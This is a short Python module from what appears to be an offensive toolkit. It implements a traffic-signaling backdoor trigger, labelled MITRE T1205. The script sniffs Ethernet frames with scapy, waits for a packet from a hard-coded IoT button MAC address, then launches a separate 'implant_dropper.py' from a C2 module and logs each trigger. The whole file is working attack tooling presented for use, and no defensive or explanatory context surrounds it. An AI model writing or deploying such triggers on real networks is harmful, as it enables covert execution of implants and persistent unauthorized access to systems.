#!/usr/bin/env python3
# modules/attacks/iot_button_backdoor.py

import time
import os
import subprocess
import json
from datetime import datetime
from scapy.all import sniff, Ether

MITRE_TTP = "T1205"
TARGET_MAC = "00:11:22:33:44:55"
PAYLOAD_SCRIPT = "modules/c2/implant_dropper.py"
LOG_FILE = "results/iot_button_backdoor_triggered.json"

def log_trigger(mac):
    os.makedirs("results", exist_ok=True)
    entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "mac_triggered": mac,
        "payload_executed": PAYLOAD_SCRIPT,
        "ttp": MITRE_TTP
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")

def packet_callback(pkt):
    if pkt.haslayer(Ether) and pkt[Ether].src.lower() == TARGET_MAC.lower():
        print(f"[✓] Button MAC {TARGET_MAC} detected – executing payload")
        subprocess.Popen(["python3", PAYLOAD_SCRIPT])
        log_trigger(TARGET_MAC)

def monitor_button():
    print(f"[*] Monitoring for button press (MAC {TARGET_MAC})...")
    sniff(prn=packet_callback, filter="ether src " + TARGET_MAC, store=0)

if __name__ == "__main__":
    monitor_button()
